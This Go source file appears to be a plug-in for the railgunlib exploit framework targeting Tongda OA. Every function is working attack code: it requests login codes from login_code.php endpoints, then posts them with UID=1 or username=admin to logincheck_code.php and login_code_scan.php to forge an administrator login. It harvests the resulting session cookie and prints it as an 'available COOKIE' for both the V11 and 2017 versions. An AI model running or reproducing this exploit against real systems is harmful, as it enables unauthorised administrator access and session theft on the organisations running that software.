package exp_TongdaOA

import (
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Data struct {
	Codeuid  string `json:"codeuid"`
	Authcode string `json:"authcode"`
}

type Status struct {
	Status string `json:"status"`
}
type Exp_Fake_User struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Fake_User) getV11Session() (result string, err error) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	checkUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/general/login_code.php"
	resp := self.HttpGetWithoutRedirect(checkUrl, headers)
	if resp.Err != nil {
		err = resp.Err
		return
	}
	text := strings.Split(resp.Body, "{")
	if len(text) > 1 {
		codeUid := strings.ReplaceAll(strings.ReplaceAll(text[len(text)-1], `}"}`, ""), "\r\n", "")
		getSessUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/logincheck_code.php"
		data := "CODEUID={" + codeUid + "}&UID=1"
		headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		resp = self.HttpPostWithoutRedirect(getSessUrl, data, headers)
		cookie := resp.Resp.Header.Get("Set-Cookie")
		if cookie != "" {
			result = cookie
		} else {
			err = fmt.Errorf("maybe Not Vulnerable")
		}
	}

	return
}
func (self *Exp_Fake_User) get2017Session() (result string, err error) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 设置
	// codeuid获取
	checkUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/ispirit/login_code.php"
	resp := self.HttpGetWithoutRedirect(checkUrl, headers)
	if resp.Err != nil {
		err = resp.Err
		return
	}
	jsonData := new(Data)
	err = json.Unmarshal([]byte(resp.Body), jsonData)
	if err != nil {
		return
	}
	codeUid := jsonData.Codeuid
	// 提交codeuid
	codeScanUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/general/login_code_scan.php"
	data := fmt.Sprintf("codeuid=%s&uid=1&source=pc&type=confirm&username=admin", codeUid)
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	resp = self.HttpPostWithoutRedirect(codeScanUrl, data, headers)

	delete(headers, "Content-Type")
	if resp.Err != nil {
		err = resp.Err
		return
	}
	status := new(Status)
	err = json.Unmarshal([]byte(resp.Body), status)
	if err != nil {
		return
	}
	// 获取cookie
	if status.Status == "1" {
		getCodeUidUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/ispirit/login_code_check.php?codeuid=" + codeUid
		resp = self.HttpGetWithoutRedirect(getCodeUidUrl, headers)
		if resp.Err != nil {
			err = resp.Err
			return
		}

		cookie := resp.Resp.Header.Get("Set-Cookie")
		if cookie != "" {
			result = cookie
		} else {
			err = fmt.Errorf("maybe Not Vulnerable")
		}

	}

	return
}
func (self *Exp_Fake_User) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	expResult.Result += "----------------------V11----------------------\r\n"
	cookie, err := self.getV11Session()
	if err != nil {
		expResult.Result += "There is wrong: " + err.Error() + "\r\n"
	} else {
		expResult.Result += "Get Available COOKIE: " + cookie + "\r\n"
	}

	expResult.Result += "----------------------2017----------------------\r\n"
	cookie, err = self.get2017Session()
	if err != nil {
		expResult.Result += "There is wrong: " + err.Error() + "\r\n"
	} else {
		expResult.Result += "Get Available COOKIE: " + cookie + "\r\n"
	}

	return
}
func init() {
	exp_register.ExpStructRegister(&Exp_Fake_User{}, "exp_fake_user.yml")
}
